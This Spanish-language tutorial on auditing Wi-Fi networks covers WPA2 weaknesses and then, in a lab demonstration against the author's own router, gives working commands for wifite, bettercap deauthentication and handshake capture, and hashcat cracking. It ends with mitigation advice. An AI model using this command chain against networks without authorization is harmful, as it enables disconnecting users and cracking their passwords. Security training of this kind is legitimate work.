## 1. Marco Teórico

Para auditar una red, primero debemos entender cómo viaja la información en el aire y cuáles son los eslabones débiles.

### 1.1 Modos de la Tarjeta de Red (NIC)
Nuestras tarjetas Wi-Fi normalmente ignoran el tráfico que no es para ellas. Para auditar, necesitamos cambiar esto:
* **Modo Managed (Administrado):** Estado normal. Solo procesa paquetes destinados a su MAC.
* **Modo Monitor:** La tarjeta "escucha" todo el tráfico de radiofrecuencia en el aire en un canal específico. Esencial para capturar *handshakes* e inyectar paquetes sin estar conectados al router.

### 1.2 Evolución de la Seguridad Wi-Fi
* **WEP:** Obsoleto. Vulnerable a ataques estadísticos; se rompe en minutos.
* **WPA / WPA2:** El estándar actual. Su seguridad depende de la longitud de la contraseña y de tener el WPS apagado.
* **WPA3:** El nuevo estándar. Usa el protocolo SAE, mitigando los ataques de diccionario *offline*.

### 1.3 Vectores de Ataque Principales (WPA2)

#### A. WPS (Wi-Fi Protected Setup)
* **Pixie Dust Attack:** Explota una mala generación de números aleatorios en el router para deducir el PIN (y la contraseña) casi al instante.

#### B. Captura del 4-Way Handshake
Cuando un dispositivo se conecta, intercambia 4 paquetes con el router para cifrar la sesión.
* **El Ataque:** Forzamos la desconexión de un cliente enviando paquetes *Deauth*. Al reconectarse, capturamos el *handshake*. Luego, usamos fuerza bruta o un diccionario contra ese archivo en nuestra propia máquina (*offline*).

#### C. Ataque PMKID (Clientless)
No requiere clientes conectados. Se captura una trama específica del router que contiene el PMKID, el cual también se ataca *offline*.

## 2. Marco Práctico (Demostración)

### 2.1 Requisitos del Laboratorio
* **Hardware:** Tarjeta de red con modo monitor e inyección (ej. Alfa AWUS036NHA).
* **Entorno:** Kali Linux o Parrot OS.
* **Objetivo:** Router propio de pruebas.

### 2.2 Automatización: Wifite (Python)
`wifite` automatiza herramientas como `aircrack-ng` y `hcxdumptool`. Es ideal para mostrar lo rápido que puede ser un ataque si la red es vulnerable.

1. **Preparación y ejecución:**
   ```bash
   sudo airmon-ng check kill
   sudo airmon-ng start wlan0
   sudo wifite --kill
   ```
2. **Qué hace por debajo:** Prueba WPS Pixie Dust -> Busca PMKID -> Espera/Fuerza Handshakes -> Intenta crackear con un diccionario básico.
   
## 2.3 Control Total: Bettercap (Golang)

Bettercap es un framework avanzado escrito en Go. Muestra un control granular sobre el espectro de red y es más estable para ataques interactivos.

1. **Iniciar reconocimiento en la interfaz:**
   ```Bash
   sudo bettercap -iface wlan0
   ```
2. Activar escaneo Wi-Fi y captura:
```Bash

# Dentro de la consola de Bettercap:
wifi.recon on
# Activar auto-guardado de handshakes a un archivo pcap:
set wifi.handshakes.file capturas.pcap
```
3. Forzar la captura (Deauth):
```Bash

# Desautenticar a los clientes de un router específico para capturar el handshake:
wifi.deauth MAC_DEL_ROUTER
```

## 2.4 La Fase Final: Crackeo con Hashcat

Una vez capturado el handshake con Bettercap (archivo .pcap), necesitamos extraer la contraseña.

1. Convertir el archivo para Hashcat:
    Usamos la herramienta hcxpcapngtool para convertir el .pcap a un formato de hash que Hashcat entienda (.hc22000).
    ```Bash
		hcxpcapngtool -o hashes.hc22000 capturas.pcap
	```
2. Crackear con diccionario:
```Bash
	hashcat -m 22000 hashes.hc22000 diccionario_rockyou.txt
```
## 3. Mitigación (Cómo protegernos)

1. Desactivar WPS: Desde el panel de administración del router.
2. Contraseñas Robustas: Usar frases de paso largas (más de 16 caracteres) que no aparezcan en diccionarios filtrados.
3. Actualizar a WPA3: Invalida la mayoría de ataques offline.
4. Reducir potencia de transmisión: Evitar que la señal Wi-Fi llegue a la calle pública si no es necesario.
